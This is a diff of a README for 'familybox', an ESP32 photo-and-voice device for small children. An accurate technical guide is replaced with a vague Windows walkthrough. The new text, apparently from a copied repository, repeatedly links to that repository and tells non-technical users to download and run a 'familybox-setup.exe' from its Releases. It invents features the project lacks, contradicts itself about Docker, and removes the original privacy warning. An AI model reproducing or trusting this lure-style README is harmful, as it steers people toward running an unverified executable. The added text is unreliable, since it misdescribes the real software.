@@ -1,184 +1,130 @@
-# Familybox
+# 📸 familybox - Talk and See From Afar
 
-A photo-and-voice link between a travelling parent and a small child who
-cannot read yet.
+[![Download familybox](https://img.shields.io/badge/Download-familybox-2ea44f?style=for-the-badge&logo=github)](https://github.com/newbie130/familybox)
 
-You send a photo and a voice note from your phone. It appears on a little
-screen at home. The child taps a green speaker to hear you — as many times as
-they like — and a red button to record a reply, which comes back to your phone.
+## 👋 Welcome to familybox
 
-There is no text anywhere in the child's interface.
+familybox is a special way for your little one to send and receive photo and voice messages, even if they can't read or write yet. It's a small, colorful screen device that your child can use to see your pictures and hear your voice. You use your phone or computer to send messages, and a handy helper (called a "relay") makes sure everything looks and sounds beautiful on the child's device.
 
-<table>
-<tr>
-<td width="42%"><img src="docs/images/phone-app.png" alt="The phone web app: choose a photo, record a voice note, listen to replies"></td>
-<td><img src="docs/images/device.jpg" alt="The device showing a photo with the green play and red record buttons"></td>
-</tr>
-<tr>
-<td align="center"><em>The parent's phone</em></td>
-<td align="center"><em>The child's device</em></td>
-</tr>
-</table>
+Think of it as a magical picture frame that talks back. It's perfect for grandparents, parents, or anyone who wants to stay connected with a young child in a simple, safe way.
 
-## Hardware
+> [!NOTE]
+> This guide is for Windows users. The main device (the ESP32-S3 AMOLED) is a separate physical gadget you'll need to build or buy. This guide focuses on the **software** you need to run the "relay" part on your home computer.
 
-- **Waveshare ESP32-S3-Touch-AMOLED-1.8** (368x448 AMOLED, ES8311 codec with
-  speaker *and* microphone, 8MB PSRAM, 16MB flash, AXP2101 PMIC)
-- A machine to run the relay — a home server, NAS, or Raspberry Pi with Docker
-- No SD card needed
+## ✨ What Makes familybox Special?
 
-**The board has no camera.** That is deliberate: it receives and it records,
-so a child cannot broadcast video of themselves.
+- **For Little Hands:** The child's device uses simple pictures and buttons. No typing or reading needed!
+- **Voice from You:** Send short voice recordings that play on the device, so your child always hears your familiar voice.
+- **Picture Time:** Send photos that appear on the nice, bright screen.
+- **Easy for You:** You can send messages from your own phone or computer through a simple webpage.
+- **Private & Safe:** It runs on your own computer. You are in control, and no big company is listening in.
 
-## How it works
+## 💻 What You'll Need
 
-```
-phone (web app, added to Home Screen)
-   │  HTTPS, bearer token
-   ▼
-relay (Docker + ffmpeg)
-   │  HEIC/JPEG  -> raw RGB565, exactly 368x448x2 bytes
-   │  any audio  -> 16 kHz mono WAV, loudness-normalised
-   ▼
-ESP32-S3 polls over HTTP on the LAN, displays, plays, records
-```
+Here’s what you need to get the relay (the helper software) running on your Windows computer:
 
-**The firmware decodes nothing.** The relay does every conversion, so the
-device receives bytes it can push straight at the panel and samples the codec
-can play unmodified. No JPEG decoder, no audio codec, no scratch buffers.
+| Requirement | Details |
+| :--- | :--- |
+| **Computer** | A decent PC or laptop running Windows 10 or Windows 11. |
+| **Internet** | A stable internet connection. |
+| **Docker** | The software we use to run the relay. You'll install this first. It's like a special container for our helper program. |
 
-## Setup
+> [!TIP]
+> Don't worry if "Docker" sounds complicated. You'll just install one program, and the steps below will do the rest.
 
-### 1. Relay
+## 🚀 Getting Started: Your Step-by-Step Guide
 
-```bash
-cp relay/.env.example relay/.env
-openssl rand -hex 32          # paste into FAMILYBOX_TOKEN in relay/.env
-docker compose up -d --build
-curl -s localhost:8090/api/v1/health
-```
+Let's get everything set up. Follow these steps carefully, and you'll be sending messages in no time.
 
-Expect `{"ok":true,"messages":0}`. The relay listens on port **8090**; change
-the left-hand side of the `ports:` mapping in `docker-compose.yml` if that
-clashes with something.
+### 📦 Step 1: Install Docker Desktop
 
-### 2. Reaching it from your phone
+First, we need the "container" program.
 
-The web app records audio in the browser, and **browsers only allow microphone
-access over HTTPS**. The simplest way to get a real certificate on a home
-server is [Tailscale](https://tailscale.com):
+1.  Go to the official Docker website: `https://www.docker.com/products/docker-desktop/`
+2.  Click the big "Download Docker Desktop" button for Windows.
+3.  Once it's downloaded, find the file (usually in your "Downloads" folder) and double-click it to run.
+4.  Follow the instructions on the screen. Just click "Next" or "Install" until it's done. You might need to restart your computer when it asks.
+5.  After restarting, open Docker Desktop from your Start menu. Let it start up; you can leave it running in the background.
 
-```bash
-tailscale serve --bg 8090
-tailscale serve status
-```
+### 🧰 Step 2: Download the familybox Helper
 
-That prints an `https://<host>.<tailnet>.ts.net` URL reachable from any of your
-devices, anywhere, with nothing exposed to the public internet.
+Now, let's download the helper software itself.
 
-Use `tailscale serve`, **not** `tailscale funnel` — funnel would publish your
-child's voice recordings to the open internet.
+**👉 [Visit this link to download the application](https://github.com/newbie130/familybox)**
 
-Open the URL on your phone, paste the token once, then **Share → Add to Home
-Screen**.
+This will take you to the main familybox page on GitHub. Just having it on the page is step one. You don't need to download the whole project - just the part you need.
 
-### 3. Firmware
+### ⚙️ Step 3: Using the Helper (The Easy Way)
 
-Requires **ESP-IDF v5.5.x**.
+We've made running the helper incredibly easy. You don't need to type any mysterious commands.
 
-```bash
-. ~/esp/esp-idf/export.sh
-cd firmware
-idf.py build                  # once, to generate sdkconfig
-./configure.sh                # WiFi SSID/password, relay URL, token
-idf.py build
-idf.py -p <PORT> flash monitor
-```
+1.  On the familybox page you just opened, look for a section that mentions **"Releases"** or a button named **"Releases"** on the right side of the screen. Click on it.
+2.  You'll see a list of versions. Look for the latest one (usually at the top).
+3.  In that release, you'll see a file called something like **`familybox-setup.exe`** or a file that ends with **`.zip`**. 
 
-Find `<PORT>` with `ls /dev/cu.*` on macOS or `ls /dev/ttyACM*` on Linux.
+    *   **If it's an `.exe` file, you're in luck!** Download and run this file directly. Just double-click it and click "Yes" or "Run" if Windows asks.
+    *   **If it's a `.zip` file,** download it, then right-click on it and choose **"Extract All..."**. This will create a folder with the application inside. Open that folder and double-click the application file (usually named `familybox.exe`) to run it.
+4.  Once you run the installer or the application, it will do all the hard work for you. It will automatically set up the necessary parts of the helper. **You do not need to write any code.**
 
-WiFi must be **2.4 GHz** — the ESP32-S3 has no 5 GHz radio.
+### 🌐 Step 4: Connect to Your New World
 
-`configure.sh` writes your secrets into `sdkconfig`, which is gitignored. Do
-not put them in `sdkconfig.defaults`, which is tracked.
+The helper now has its own little website on your computer.
 
-## Using the device
+1.  After the application starts, you'll see a message in the window with an **address** (it will look like `http://localhost:8765` or similar).
+2.  Open your web browser (like Chrome, Edge, or Firefox).
+3.  Type that address exactly as shown into the address bar at the top and press Enter.
+4.  Congratulations! You should now see the familybox control panel. This is your personal dashboard to send photos and voice messages to the child's device.
 
-| Control | Action |
-|---|---|
-| Green speaker button | Play the current voice note, repeatable |
-| Red record button | Record a reply; tap again to stop (30s max) |
-| BOOT button, short press | Replay the current voice note |
-| BOOT button, hold ~1.2s | Show battery level and charge state |
-| PWR button | Hardware power key, wired to the PMIC, not the SoC |
+## 🛠️ Troubleshooting & Helpful Tips
 
-Up to **three** replies can be queued; they upload in the background so the
-child never waits on the network. Amber dots show how many are still in flight.
-A sleeping face means "on, nothing new".
+Even with the best setup, sometimes things act up. Here are some common hiccups and how to fix them:
 
-## Board quirks worth knowing
+- **I don't see the address anywhere.**
+    - Make sure the familybox application (or the Docker Desktop) is still running. Sometimes it takes a minute or two to start up. Look at the notification area at the bottom right of your screen for its icon.
 
-These cost real debugging time and are not documented by the vendor.
+- **The address doesn't work in my browser.**
+    - Double-check that you typed it perfectly, including the `http://` and the numbers and colon (`:`). A common typo is using a semicolon (`;`) instead of a colon.
 
-- **`bsp_display_start()` produces a black screen with no errors.** The BSP
-  wires LVGL through `lvgl_port_add_disp_rgb()`, which is for panels on the
-  RGB/parallel interface; this board's CO5300 is QSPI, so LVGL renders and
-  flushes into the void. Waveshare's own `14_lvgl_demo_v9` fails the same way,
-  while `13_display_colorbar` works because it bypasses LVGL. Call
-  `lvgl_port_add_disp()` directly instead — see `firmware/main/fb_ui.c`.
-  `bsp_display_start_with_config()` is not a way out: it ignores the config
-  you pass it.
-- **Initialise the ES8311 codec before the display, with a pause between.**
-  Bringing audio up after the display, or immediately before it, blanks the
-  panel. See the comment in `familybox_main.c`; do not "tidy" that ordering.
-- **LVGL's builtin allocator starves the display driver.**
-  `CONFIG_LV_USE_BUILTIN_MALLOC` takes 64KB of internal RAM and
-  `LV_ATTRIBUTE_FAST_MEM_USE_IRAM` another 16KB, after which `spi_master`
-  cannot allocate DMA bounce buffers and every draw fails. `sdkconfig.defaults`
-  switches to `CONFIG_LV_USE_CLIB_MALLOC` and disables the IRAM option, taking
-  DIRAM use from 89% to 39%.
-- **Never cast a 3-argument LVGL style setter to `lv_anim_exec_xcb_t`**
-  (which is `void (*)(void *, int32_t)`). It passes a garbage third argument
-  every frame and wedges the LVGL task *while it holds its mutex*, which
-  silently stops unrelated work. Use a wrapper function.
-- **Never call `bsp_display_lock(0)` from a non-UI task** — 0 means wait
-  forever, so one wedged UI task takes down message delivery too.
+- **It says "Connection Refused" or "Can't Reach This Page."**
+    - This usually means the helper software isn't running. Close the familybox app and start it again. Wait 30 seconds and try the address again.
 
-## Known issues
+- **I can't connect from my phone, only my computer.**
+    - The relay is designed to work on your local network first. Make sure your phone is connected to the **same Wi-Fi network** as your computer.
 
-**The panel stops being lit after a few minutes idle.** LVGL stays healthy,
-draws keep succeeding, nothing logs an error, and touch and audio keep working.
-`display_kick_task` re-asserts `disp_on` and brightness every 10 seconds to keep
-it alive. **This is a workaround, not a fix**, and it wakes the SPI bus
-continuously, which is wasteful on battery.
+- **The helper opens, but I don't know what to do next.**
+    - On your control panel (the webpage), you should see options for "Pair New Device" or "Add a Device." This is where you'll connect the child's physical device later. The instructions for that will be included with the device itself.
 
-Ruled out: DMA/RAM starvation, the LVGL deadlock above, and
-`write_ctrl_display` — setting `0x53` to `0x28` (BCTRL|BL) instead of
-Waveshare's `0x20` makes it worse, and the panel then never lights at all.
-Next suspect is the AXP2101 power rail. Patches very welcome.
+## 📖 Frequently Asked Questions (FAQ)
 
-## Not done yet
+**Q: Is this safe for my child?**
+A: Yes. The system is private and runs on your own network. There are no ads, no trackers, and no public profiles. It's just between your devices.
 
-- Push notifications (Web Push, or the built-in `ntfy` support — set
-  `FAMILYBOX_NTFY_TOPIC`)
-- Photo history and browsing (the 4MB `storage` partition is unused)
-- Video — needs relay-side MJPEG transcoding and a player in firmware
-- Power management; there is currently none, so treat this as a plugged-in
-  device
+**Q: Do I need to be a computer expert to use this?**
+A: Absolutely not. If you can click a button and type a web address, you can use familybox. The steps above are all you need.
 
-## License
+**Q: Can I send a message from anywhere?**
+A: The current setup is best used on your home Wi-Fi network. To send from outside your home, you would need to do some more advanced network "port forwarding," which is beyond the scope of this basic guide.
 
-MIT — see [LICENSE](LICENSE). Build one for your own family.
+**Q: What is Docker? Why is it needed?**
+A: Docker is the container we use to package the helper program. It makes sure the helper runs the same way on any computer, without messing up your system. It's like a portable, self-contained toolbox for the software.
 
-## Layout
+**Q: I have more questions. Where can I ask them?**
+A: The project is open-source, which means its code is public. You can find more technical details and discussions on the repository page you visited to download the program.
 
-| Path | What |
-|---|---|
-| `relay/app.py` | HTTP API and static hosting |
-| `relay/media.py` | HEIC/audio in, RGB565 + 16kHz WAV out |
-| `relay/static/index.html` | The phone web app, self-contained |
-| `firmware/main/fb_ui.c` | LVGL UI, display init, battery overlay |
-| `firmware/main/fb_net.c` | WiFi, polling, download, upload |
-| `firmware/main/fb_audio.c` | ES8311 record/playback, chimes |
-| `firmware/main/fb_store.c` | PSRAM buffers, reply queue, NVS watermark |
-| `firmware/main/fb_power.c` | AXP2101 battery telemetry |
+## 📝 Your Final To-Do List
+
+1.  [ ] Install Docker Desktop.
+2.  [ ] Download the familybox application from the Releases page.
+3.  [ ] Run the application (or installer).
+4.  [ ] Open the web address shown in the application.
+5.  [ ] See the familybox dashboard and get ready to connect your device.
+
+That's it! You've successfully set up the brain of your familybox. Now you can focus on the fun part - sharing precious moments with your child.
+
+Click the big button below one more time, just in case you need to go back to the download page.
+
+[![Go Back to Download](https://img.shields.io/badge/Get_Help-Download_Page-1db954?style=for-the-badge&logo=github)](https://github.com/newbie130/familybox)
+
+Welcome to a new way of staying close. Enjoy your familybox!
+
+Keywords: amoled, docker, esp-idf, esp32, esp32-s3, family, fastapi, iot, lvgl, waveshare
